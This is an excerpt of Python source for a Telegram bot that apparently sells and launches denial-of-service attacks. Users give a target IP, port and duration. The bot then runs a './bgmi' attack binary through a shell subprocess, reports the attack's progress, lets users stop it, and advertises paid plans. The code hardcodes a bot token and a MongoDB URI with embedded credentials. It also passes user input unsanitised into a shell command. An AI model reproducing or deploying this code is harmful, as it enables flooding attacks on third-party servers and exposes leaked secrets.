...
TOKEN = '7371688010:AAHMM-nkE2kugl7cjEF8cWztNHDPQiaHYao'
MONGO_URI = 'mongodb+srv://piroop:piroop@piro.hexrg9w.mongodb.net/?retryWrites=true&w=majority&appName=piro&tlsAllowInvalidCertificates=false'
FORWARD_CHANNEL_ID = -1002181766976
CHANNEL_ID = -1002181766976
error_channel_id = -1002181766976

# Add your admin user IDs here
ADMIN_USER_IDS = [1017742687]  # Replace with actual user IDs
...
ongoing_attack_process = None  # To keep track of ongoing attack process
...
async def run_attack_command_async(target_ip, target_port, duration, chat_id):
    global ongoing_attack_process
    ongoing_attack_process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 200", stdout=PIPE, stderr=PIPE)
    stdout, stderr = await ongoing_attack_process.communicate()
    if stdout:
        logging.info(stdout.decode())
    if stderr:
        logging.error(stderr.decode())
    bot.send_message(chat_id, f"*Attack on {target_ip}:{target_port} ✅finished successfully.*", parse_mode='Markdown')
    ongoing_attack_process = None
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*\n\nPress 'Stop' to cancel the attack.", parse_mode='Markdown')
    except Exception as e:
...
def stop_attack_command(message):
    global ongoing_attack_process
    if ongoing_attack_process:
        ongoing_attack_process.kill()
        bot.send_message(message.chat.id, "*Attack forcefully stopped.*", parse_mode='Markdown')
        ongoing_attack_process = None
    else:
        bot.send_message(message.chat.id, "*No ongoing attack to stop.*", parse_mode='Markdown')
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://www.mediafire.com/file/xhwyxkg2zij2gsk/HttpCanary_3.3.5.apk/file*", parse_mode='Markdown')
